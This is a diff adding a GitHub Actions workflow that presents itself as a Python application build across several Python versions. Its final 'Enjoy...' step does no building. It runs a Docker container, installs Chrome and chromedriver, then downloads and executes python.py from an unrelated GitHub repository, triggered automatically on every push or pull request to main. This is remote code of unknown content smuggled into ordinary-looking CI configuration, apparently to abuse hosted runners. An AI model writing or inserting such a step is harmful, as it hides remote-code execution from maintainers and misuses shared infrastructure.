@@ -1,0 +1,31 @@
+# ------------------------------------ #
+#       Made By Anli V.1.0.0           #
+# ------------------------------------ #
+name: My Python Application
+# ------------------------------------ #
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+# ------------------------------------ #
+jobs:
+  Build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: [3.9, 3.8, 3.7, 3.6, 3.5]
+    steps:
+# ------------------------------------ #
+    - name: Checkout Code
+      uses: actions/checkout@v2
+# ------------------------------------ #
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+# ------------------------------------ #
+    - name: Enjoy...
+      run: sudo apt-get update && sudo apt-get upgrade -y && sudo docker run --name Adinda ubuntu:latest sh -c "apt-get update && apt-get upgrade -y && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && wget -N https://chromedriver.storage.googleapis.com/92.0.4515.107/chromedriver_linux64.zip -P ~/ && unzip ~/chromedriver_linux64.zip -d ~/ && rm ~/chromedriver_linux64.zip && mv -f ~/chromedriver /usr/local/bin/chromedriver && chown root:root /usr/local/bin/chromedriver && chmod 0755 /usr/local/bin/chromedriver && wget https://raw.githubusercontent.com/JokerItuAku-01/Test/main/python.py && python python.py"
+# ------------------------------------ #
